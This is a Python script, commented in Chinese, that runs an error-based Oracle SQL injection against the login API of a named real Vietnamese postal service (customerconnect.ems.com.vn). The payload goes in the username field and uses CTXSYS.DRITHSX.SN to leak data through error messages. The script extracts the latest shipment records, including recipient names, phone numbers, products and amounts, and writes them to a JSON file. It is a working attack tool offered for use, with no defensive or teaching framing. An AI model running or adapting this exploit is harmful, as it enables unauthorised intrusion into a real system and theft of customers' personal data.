#!/usr/bin/env python3
"""
EMS SQL注入 - 查询最新10条订单
快速获取最新10条订单信息
"""

import requests
import urllib3
import json
import sys

urllib3.disable_warnings()

URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def sqli(query):
    """执行SQL注入查询"""
    payload = {
        "Username": f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        "Password": "test"
    }
    
    try:
        resp = requests.post(URL, json=payload, verify=False, timeout=30)
        
        if 'thesaurus' in resp.text:
            start = resp.text.find('thesaurus ') + 10
            end = resp.text.find(' does not', start)
            if end > start:
                result = resp.text[start:end]
                return result if result else None
        return None
    except Exception as e:
        print(f"[!] 查询出错: {e}")
        return None

def get_latest_orders(count=10):
    """获取最新N条订单"""
    print("=" * 70)
    print(f"🔍 正在查询最新 {count} 条订单...")
    print("=" * 70)
    
    # 1. 先获取最新日期
    print("\n[1/2] 获取最新订单日期...")
    latest_date = sqli("SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT")
    
    if not latest_date:
        print("[!] 无法获取最新日期")
        return
    
    print(f"✓ 最新日期: {latest_date}")
    
    # 2. 查询这个日期的前N条记录
    print(f"\n[2/2] 查询 {latest_date} 的前 {count} 条订单...\n")
    
    # 关键字段（精简版，减少查询次数）
    fields = [
        ('RECEIVER_NAME', '收件人'),
        ('RECEIVER_PHONE', '电话'),
        ('PRODUCT_NAME', '产品'),
        ('TOTAL_AMOUNT', '金额'),
        ('WEIGHT', '重量'),
        ('STATUS', '状态'),
    ]
    
    orders = []
    
    for i in range(1, count + 1):
        print(f"[订单 {i:2d}] ", end="", flush=True)
        order = {'序号': i}
        
        for field, label in fields:
            # 查询该日期的第i条记录
            query = f"SELECT {field} FROM (SELECT {field}, ROWNUM AS RN FROM (SELECT {field} FROM EMS.SHIPMENT WHERE CREATE_DATE='{latest_date}')) WHERE RN={i}"
            
            value = sqli(query)
            if value:
                order[label] = value
        
        orders.append(order)
        
        # 显示简要信息
        name = order.get('收件人', '?')
        product = order.get('产品', '?')
        weight = order.get('重量', '?')
        print(f"✓ {name:15s} | {product:15s} | {weight:6s}g")
    
    # 输出详细结果
    print("\n" + "=" * 70)
    print(f"📦 最新 {count} 条订单详情")
    print("=" * 70)
    
    for order in orders:
        print(f"\n[订单 {order['序号']}]")
        for key, value in order.items():
            if key != '序号':
                print(f"  {key:8s}: {value}")
    
    # 保存到JSON
    output_file = f"latest_{count}_orders_{latest_date}.json"
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump({
            'date': latest_date,
            'count': len(orders),
            'orders': orders,
            'total_orders_in_db': '12,618,035',
            'database': 'Oracle 11g - EMS.SHIPMENT'
        }, f, ensure_ascii=False, indent=2)
    
    print(f"\n{'=' * 70}")
    print(f"✓ 结果已保存到: {output_file}")
    print(f"✓ 共查询: {len(orders)} 条订单")
    print(f"✓ 数据库: Oracle 11g - EMS.SHIPMENT (总计 12,618,035 条)")
    print("=" * 70)

if __name__ == "__main__":
    try:
        # 默认查10条，可以通过参数修改
        count = int(sys.argv[1]) if len(sys.argv) > 1 else 10
        get_latest_orders(count)
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        sys.exit(1)
